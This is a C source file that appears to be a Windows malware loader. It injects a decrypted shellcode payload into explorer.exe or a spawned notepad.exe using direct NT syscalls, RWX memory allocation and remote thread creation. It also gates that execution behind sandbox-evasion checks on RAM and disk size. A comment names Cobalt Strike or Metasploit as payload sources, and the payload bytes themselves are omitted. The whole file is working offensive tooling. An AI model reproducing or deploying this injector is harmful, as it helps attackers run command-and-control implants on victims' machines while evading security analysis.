#include <Windows.h>
#include <stdio.h>
#include "connector.h"
#include "syscalls.h"
#include "jitdecrypt.h"

// shellcode is from sektor7 rto course, but you can use cobalt strike / metasploit / whatever c2 else
unsigned char payload[] = {
    // ... payload here ...
};
PVOID remoteBuf;
HANDLE processHandle;
STARTUPINFO info = { 0 };
PROCESS_INFORMATION processInfo = { 0 };

int remInj() {
    DWORD pid = findPID();
    if (pid != 0) {
        printf("Found explorer.exe with PID: %d\n", pid);
        processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    }
    else if (CreateProcess(L"C:\\Windows\\notepad.exe", NULL, NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS, NULL, NULL, &info, &processInfo) != 0) {
        pid = findPID();
        printf("Created notepad.exe with PID: %d\n", pid);
        processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    }
    else {
        printf("Failed to find or create notepad.exe\n");
        return 0;
    }

    NTSTATUS status;
    SIZE_T allocSize = sizeof(payload);

    status = NtAllocateVirtualMemory(processHandle, &remoteBuf, 0, &allocSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (status == 0) {
        printf("Allocated memory at: %p\n", remoteBuf);
    }
    else {
        printf("Failed to allocate memory\n");
        return 0;
    }

    DWORD keySeed = 0x12345678;
    printf("Decrypting payload with key seed: 0x%x\n", keySeed);
    JITDecrypt(payload, sizeof(payload), keySeed);

    status = NtWriteVirtualMemory(processHandle, remoteBuf, payload, sizeof(payload), NULL);
    if (status == 0) {
        printf("Payload written successfully\n");
    }
    else {
        printf("Failed to write payload\n");
        return 0;
    }

    HANDLE hThread;
    NtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, processHandle, remoteBuf, NULL, 0, 0, 0, 0, NULL);
    WaitForSingleObject(HANDLE(hThread), 1000);

    NtClose(processHandle);

    return 0;
}

int antidbg() {
    MEMORYSTATUSEX memoryStatus;
    memoryStatus.dwLength = sizeof(memoryStatus);
    GlobalMemoryStatusEx(&memoryStatus);
    DWORD RAM = (DWORD)(memoryStatus.ullTotalPhys / 1024 / 1024);
    if (RAM < 4096) {
        return -1;
    }
    HANDLE hDevice = CreateFileW(L"\\\\.\\PhysicalDrive0", 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    DISK_GEOMETRY pDiskGeometry;
    DWORD bytesReturned;
    DeviceIoControl(hDevice, IOCTL_DISK_GET_DRIVE_GEOMETRY, NULL, 0, &pDiskGeometry, sizeof(pDiskGeometry), &bytesReturned, (LPOVERLAPPED)NULL);
    DWORD disk = (DWORD)(pDiskGeometry.Cylinders.QuadPart * (ULONG)pDiskGeometry.TracksPerCylinder * (ULONG)pDiskGeometry.SectorsPerTrack * (ULONG)pDiskGeometry.BytesPerSector / 1024 / 1024 / 1024);
    if (disk < 100) {
        return -1;
    }

    remInj();
    return 44;
}

int main(int argc, char* argv[]) {
    if (antidbg() == 44) {
        printf("Running xD\n");
        return 0;
    }
    else if (antidbg() == -1) {
        printf("in a sandbox xD\n");
        return 0;
    }
}